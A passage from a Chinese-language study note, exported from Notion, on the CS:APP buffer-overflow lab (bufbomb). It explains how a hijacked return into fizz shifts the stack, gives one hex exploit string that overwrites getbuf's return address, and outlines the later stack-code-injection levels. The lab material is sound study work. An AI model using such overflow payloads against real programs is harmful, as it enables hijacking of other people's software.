id="https://www.notion.so/3dad4d3313ba49fea59f24f15bc12df1" class="Divider"></div><div id="https://www.notion.so/3fc34b67cdb547cca8b866a0bebc8977" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">想象一下，ebp在0处，当leave时，esp被赋予0，现在esp和ebp都指向0，然后pop ebp </span></span></p></div><div id="https://www.notion.so/2f0026c915474b28a54d715dcd7f0a12" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">ebp指向old ebp esp指向4（每次pop esp自加4）</span></span></p></div><div id="https://www.notion.so/704a5fda6b1b42b589613624fd0b5199" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">然后ret时 pop eip 这时eip指向修改过的返回地址，esp指向8</span></span></p></div><div id="https://www.notion.so/1012dc118e1d409f941aff0768b9602a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">然后修改过的返回地址对应的指令在fizz中是push ebp，那么ebp的值（old ebp，已经被架空了的）放到8，然后esp指向4（每次push esp自减4）</span></span></p></div><div id="https://www.notion.so/1bfbeb2a56124a278341ff28e88816b5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">之后mov    %esp,%ebp 让ebp也指向esp的指向，即4，那么现在的ebp相较于之前的在0处的ebp，向上走了4</span></span></p></div><div id="https://www.notion.so/7feabf1bec5f4707addac32ddc17f607" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">fizz的ebp+8，其实是getbuf的ebp+12</span></span></p></div><div id="https://www.notion.so/b3067a63d293485193066fe84cc8a336" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 af 8d 04 08
</mark></strong></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">00 00 00 00 </mark></span></strong></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">28 4e 6b 20</mark></strong></span></span></p></div><h1 id="https://www.notion.so/8a76b486c2454cdc8499ec0c885dbaa6" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/8a76b486c2454cdc8499ec0c885dbaa6"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever2-Firecracker 爆竹</span></span></h1><div id="https://www.notion.so/c022d7bb38024b4ea4d0ba87cc688da5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">一种更为复杂的缓冲区攻击形式涉及到提供一个编码实际机器指令的字符串。然后利用字符串用堆栈上这些指令的起始地址覆盖返回指针。</span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">当调用函数(在本例中为getbuf)执行其ret指令时，程序将开始执行堆栈上的指令</span></span><span class="SemanticString">，而不是返回。使用这种形式的攻击，让程序做几乎任何事情。放在堆栈上的代码称为</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">漏洞利用代码。</mark></span></span></p></div><div id="https://www.notion.so/0eb6097f980243d2943f456c92b0c2a1" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Ff988264b-2dba-42b6-a774-5c0180e87f19%2FUntitled.png?width=589.9999389648438&amp;table=block&amp;id=0eb6097f-9802-43d2-943f-456c92b0c2a1"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Ff988264b-2dba-42b6-a774-5c0180e87f19%2FUntitled.png?width=589.9999389648438&amp;table=block&amp;id=0eb6097f-9802-43d2-943f-456c92b0c2a1" style="width:589.9999389648438px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0577661ee5154b34b0f73f9abc14882e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">调用bang，但是在此之前将global_value设置为userid的cookie</span></span></p></div><h1 id="https://www.notion.so/563bd26788134040b2a0df0b1a3d3c7f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/563bd26788134040b2a0df0b1a3d3c7f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever3-Dynamite 炸药</span></span></h1><div id="https://www.notion.so/a7e3dc5cf4cc441da8c506eeb4d6d95b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">更加隐蔽——让getbuf返回我的cookie，而不是返回正常执行的0x1，同时需要返回test，</span></span></p></div><div id="https://www.notion.so/4648374654e64993ac20806f12a4eaf9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">（将机器码放入堆栈，设置返回指针为代码开头，撤销一切对堆栈的破坏）</span></span></p></div><div id="https://www.notion.so/b2092487c9fe437c98c6fa13f3b71b1c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">没咋看懂， 😵‍💫</span></span></p></div><div id="https://www.notion.so/d0a4566b99414127b441af5d33800c84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3d22c520cce5447ba02d18983923c7a3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5eb1d7d6d5cb4f7e8a9996a9e54260f5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h1 id="https://www.notion.so/4aa66bfeda014204a256bafbdc849d69" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/4aa66bfeda014204a256bafbdc849d69"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever4-Nitroglycerin 硝酸甘油</span></span></h1><div id="https://www.notion.so/302a3a078b694ef190a4fce13f4f9c06" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">用-n标准来运行，不再调用getbuf，调用getbufn,拥有512字符缓冲区，需要提供五次字符串，指向getbufn五次，每次都有不同偏移量，需要这五次均返回cookie，最后需要恢复到testn</span></span></p></div><div id="https://www.notion.so/3402ae0f9f804328a399f74f34824656" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>
  <footer class="Footer">
  <div>&copy; 这儿是什么地方 2022</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>
</body>

</html>